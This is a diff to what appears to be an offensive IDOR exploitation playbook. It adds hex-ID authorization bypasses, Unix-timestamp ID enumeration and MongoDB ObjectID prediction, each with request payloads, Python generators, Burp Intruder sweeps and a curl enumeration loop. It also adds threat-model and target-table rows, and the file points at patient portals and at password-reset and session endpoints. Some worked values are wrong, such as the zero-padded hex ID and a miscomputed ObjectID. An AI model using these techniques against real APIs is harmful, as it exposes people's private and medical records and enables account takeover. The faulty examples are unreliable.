@@ -983,9 +983,152 @@ DELETE /api/schedules/job_4521                         ← delete another org's 
 
 ---
 
+## Hex-Encoded Numeric ID Bypass
+**Reference type:** Numeric (hexadecimal representation)
+**API pattern:** REST
+**Authorization flaw:** Access control validates the object ID only as a decimal integer. The backend database or ORM accepts hexadecimal representations of the same integer transparently. When the ACL check receives `0x4642d` it fails a strict numeric equality check (`id === 287789`) or regex (`^\d+$`) and skips authorization — the query layer then converts the hex to decimal and fetches the object.
+**Escalation:** Horizontal
+**Business impact:** Any numeric-ID-protected object accessible to any authenticated user by supplying its hex equivalent, bypassing integer-format ACL guards.
+**Test payload:**
+```http
+# Normal request (blocked by ACL):
+GET /api/users/287789/profile HTTP/1.1
+Authorization: Bearer <your-token>
+→ 403 Forbidden
+
+# Hex bypass:
+GET /api/users/0x4642d/profile HTTP/1.1
+Authorization: Bearer <your-token>
+→ 200 OK (same object, ACL skipped)
+
+# Also try:
+GET /api/orders/0x4642e HTTP/1.1          ← next sequential object
+GET /api/invoices/0x00044333 HTTP/1.1     ← zero-padded hex
+GET /api/documents/0X4642D HTTP/1.1      ← uppercase X variant
+
+# Convert between decimal and hex:
+python3 -c "print(hex(287789))"   # → 0x4642d
+python3 -c "print(int('0x4642d', 16))"  # → 287789
+
+# Burp Intruder: use 'Numbers' payload type in Hex format, step through range
+# Payload type: Numbers → Format: Hex → From: 0x44000 To: 0x45000 Step: 1
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+---
+
+## Unix Timestamp Object ID Enumeration
+**Reference type:** Numeric (Unix epoch timestamp)
+**API pattern:** REST
+**Authorization flaw:** Object IDs are set to the Unix timestamp of creation time rather than a random value. Timestamps are deterministic and predictable — any authenticated user who knows the approximate creation window of another user's object can enumerate every possible ID within that window by iterating seconds/milliseconds. No ownership check prevents fetching objects by timestamp ID.
+**Escalation:** Horizontal
+**Business impact:** Any object created within a guessable time window is fully enumerable. Particularly impactful for password reset tokens, session IDs, document exports, or payment records stored with timestamp-based IDs.
+**Test payload:**
+```http
+# Observe timestamp-based ID from your own object:
+POST /api/documents {"title": "test"}
+→ {"id": 1695574808, "title": "test", "created_at": "2023-09-24T12:00:08Z"}
+# id = Unix timestamp of creation
+
+# Enumerate all documents created within a time window:
+GET /api/documents/1695574800 HTTP/1.1   ← 8 seconds before yours
+GET /api/documents/1695574801 HTTP/1.1
+GET /api/documents/1695574802 HTTP/1.1
+...
+GET /api/documents/1695574900 HTTP/1.1   ← 92 seconds of enumeration covers full minute
+
+# Convert target time window to Unix timestamps:
+python3 -c "import datetime; print(int(datetime.datetime(2023,9,24,12,0,0).timestamp()))"
+# → 1695574800
+
+# Burp Intruder sweep:
+# Payload: Numbers → From: 1695574800 To: 1695575400 Step: 1 (600 requests = 10 min window)
+
+# Millisecond timestamps (more IDs, still enumerable within short window):
+GET /api/sessions/1695574808123 HTTP/1.1
+# Sweep: From: 1695574808000 To: 1695574808999 Step: 1 (1000 requests = 1 second of ms)
+
+# High-value targets with timestamp IDs:
+# - Password reset tokens
+# - Email verification links
+# - Temporary download links
+# - Session tokens generated at login
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+---
+
+## MongoDB ObjectID Prediction
+**Reference type:** MongoDB ObjectID (12-byte structured identifier)
+**API pattern:** REST / GraphQL
+**Authorization flaw:** MongoDB ObjectIDs are not random — they encode creation timestamp, machine identifier, process ID, and an incrementing counter. An attacker who possesses one ObjectID can derive: (1) the exact creation time, (2) approximate IDs of objects created around the same time (same machine/process → counter differs by small delta). No ownership check prevents fetching other objects whose ObjectIDs fall within the predictable range.
+**Escalation:** Horizontal
+**Business impact:** Mass enumeration of any MongoDB-backed object (user records, orders, messages, files) without requiring random ID brute-force. Single known ObjectID leaks the creation-time anchor for targeted enumeration.
+**Test payload:**
+```
+# MongoDB ObjectID structure (24-char hex = 12 bytes):
+# [4 bytes: Unix timestamp][3 bytes: machine ID][2 bytes: process ID][3 bytes: counter]
+# Example: 507f1f77bcf86cd799439011
+#   507f1f77  = timestamp (seconds since epoch)
+#   bcf86c    = machine identifier
+#   d799      = process ID
+#   439011    = auto-incrementing counter
+
+# Step 1: Extract creation timestamp from a known ObjectID
+python3 -c "
+from bson import ObjectId
+oid = ObjectId('507f1f77bcf86cd799439011')
+print('Created at:', oid.generation_time)
+print('Timestamp:', int(oid.generation_time.timestamp()))
+"
+# → Created at: 2012-10-17 20:27:35+00:00
+
+# Step 2: Generate ObjectIDs for adjacent seconds (same machine/process, counter varies)
+python3 -c "
+from bson import ObjectId
+import datetime
+# Generate ObjectID for 5 minutes before the known one
+target_time = datetime.datetime(2012, 10, 17, 20, 22, 35)
+fake_oid = ObjectId.from_datetime(target_time)
+print(fake_oid)  # → 507f0bfb0000000000000000 (anchor for enumeration)
+"
+
+# Step 3: Enumerate by varying the counter bytes (same timestamp/machine/process)
+# Counter range: 000000 → ffffff (16M possibilities, but practically 1-1000 per second)
+# Base OID with counter sweep:
+# 507f1f77bcf86cd799439011  ← known
+# 507f1f77bcf86cd799439010  ← counter-1 (object created just before)
+# 507f1f77bcf86cd799439012  ← counter+1 (object created just after)
+# 507f1f77bcf86cd799439000  ← start of same second
+# 507f1f77bcf86cd799439fff  ← end of same second
+
+# Step 4: Test adjacent ObjectIDs via API
+GET /api/users/507f1f77bcf86cd799439010 HTTP/1.1
+GET /api/users/507f1f77bcf86cd799439012 HTTP/1.1
+Authorization: Bearer <your-token>
+
+# Step 5: For timestamp-range enumeration, generate all ObjectIDs in a window:
+python3 -c "
+from bson import ObjectId
+import datetime
+start = datetime.datetime(2023, 1, 1, 0, 0, 0)
+for s in range(3600):  # 1 hour window
+    t = start + datetime.timedelta(seconds=s)
+    print(ObjectId.from_datetime(t))
+" | while read oid; do
+  curl -s -H "Authorization: Bearer <token>" https://target.com/api/orders/$oid
+done
+
+# Burp: use generated ObjectID list as payload in Intruder
+# Key indicator: ObjectID ends in 000000 → generated synthetically (no counter → enumeration anchor)
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+---
+
 ## Threat Model
 
-> Current patterns as of 2026-05-25. Update each session.
+> Current patterns as of 2026-05-26. Update each session.
 
 **What's being exploited in the wild:**
 
@@ -1046,6 +1189,13 @@ DELETE /api/schedules/job_4521                         ← delete another org's 
     industry — target healthcare SaaS, lab management systems, and patient-portal APIs for
     highest probability of finding critical IDOR findings.
 
+12. **Alternative numeric ID representations** (NEW 2026-05) — ACL middleware often
+    validates that an ID is numeric and belongs to the session user using an equality check
+    on the decimal form. Submitting the same ID as hexadecimal (`0x4642d`), as a Unix
+    timestamp, or exploiting predictable MongoDB ObjectID counter bytes bypasses these
+    guards because the format check fails before ownership is ever verified. These are
+    low-effort, high-yield bypasses on any platform using MongoDB or timestamp-based IDs.
+
 ---
 
 ## Bypass Matrix
@@ -1072,6 +1222,9 @@ DELETE /api/schedules/job_4521                         ← delete another org's 
 | High-entropy object IDs | SQL-inject the same ID parameter — entropy prevents brute force, not injection |
 | GraphQL endpoint (auth assumed) | Send GraphQL query with NO Authorization header — endpoint may be fully public |
 | Operations not in GraphQL schema | Analyze client JS bundles for unlisted operation names on `/graphql-ws` |
+| Integer-format ACL guard | Submit ID in hex: `0x4642d` — ORM resolves to same row, ACL skips non-decimal input |
+| Numeric ID seems random | Check if it's a Unix timestamp — enumerate ±N seconds around a known anchor |
+| MongoDB ObjectID (hard to guess) | Extract timestamp from known ObjectID; sweep counter bytes of same timestamp/machine/process |
 
 ---
 
@@ -1100,6 +1253,9 @@ DELETE /api/schedules/job_4521                         ← delete another org's 
 | `/api/v1/schedules?projectId=` | Scheduled job IDOR | Cross-org pipeline configs, credentials, output data |
 | MedTech / patient-portal APIs | Any IDOR type | 36% of MedTech bounties are IDOR — highest-ratio industry |
 | Government platform APIs | Any IDOR type | 18% of gov bounties — high-value PII, citizen records |
+| Any endpoint with numeric ID in hex range | Hex ID bypass | ACL skips non-decimal input; ORM fetches object normally |
+| Password reset / session endpoints with timestamp IDs | Timestamp enumeration | Deterministic IDs enable targeted window sweep → ATO |
+| MongoDB-backed `/api/users/{objectId}` | ObjectID prediction | Counter bytes enumerable → cross-user data access |
 
 ---
 
